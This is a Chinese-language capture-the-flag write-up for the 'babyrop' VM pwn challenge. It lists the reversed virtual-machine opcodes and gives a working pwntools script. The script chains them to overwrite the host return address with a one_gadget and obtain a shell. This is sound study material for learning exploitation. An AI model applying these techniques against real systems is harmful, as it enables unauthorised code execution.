# babyrop

## 题目简述

题目是一个 VM pwn，需要先逆向自定义虚拟机指令。关键在于虚拟机指令可以移动 VM 栈指针并向宿主栈相对位置写入数据，从而修改返回地址为 one_gadget。解法核心是识别 `pop10`、`push longlong`、`mov [rsp+8],0`、`mov [rsp],int`、`mov [rsp-8],[rsp]` 和 `add [rsp-8],[rsp]` 等指令语义，然后组合 payload 覆盖返回地址。

题目资料地址：https://github.com/coc-cyqh/babyrop

作者给出的利用思路强调先把 VM 的 `sp` 调到 `rbp+8` 附近；`pop10` 指令最多只能调用两次，为避免触发 `len == 0` 检查，需要在两次 `pop10` 之间穿插一次 `push`。拿到 libc 基址后，用 `0x56` 写立即数、`0x21` 做加法逐步构造 one_gadget 地址，并用 `0x38` 把 `[rsp+8]` 置 0 来满足 one_gadget 约束。

## 解题过程

一个简单的vmpwn，通过虚拟机指令能修改返回地址为Onegadget  
逆向一下一些指令：

0x28：pop10 ，sp指针下移10

0x15: push longlong

0x38:mov \[rsp+8\],0

0x56:mov \[rsp\],int

0x34:mov \[rsp-8\],\[rsp\]; rsp —

0x21:add \[rsp-8\],\[rsp\]

```python
from pwn import *
r = process('./bin')
#r = remote('')
context.log_level = 'debug'

payload =  chr(0x28)                 #pop10
payload += chr(0x15) + p64(0)        #push 1
payload += chr(0x28)                 #pop10
payload += chr(0x38)                 #mov [rsp+8],0
payload += chr(0x56) + p32(0x24a3a)  #mov [rsp],0x24a3a
payload += chr(0X34)                 #mov [rsp-8],[rsp]   rsp -=8 
payload += chr(0x21)                 #add [rsp-8],[rsp]                          
payload += chr(0X34)*5               #mov [rsp-8],[rsp]   rsp -=8

r.sendline(payload)
r.interactive()
```

## 方法总结

- 核心技巧：先还原 VM 指令对栈指针和栈内存的影响，再把 VM 数据操作转化为宿主返回地址覆盖。
- 识别信号：题目没有明显传统溢出，但 VM 指令能读写 `[rsp+offset]` 并移动 `rsp` 时，应检查是否能把 VM 栈操作映射到真实返回地址。
- 复用要点：VM pwn 的 exploit 应保留指令语义注释，便于复查每一步栈布局；one_gadget 偏移依赖 libc 和约束，复现时需要确认远程环境。

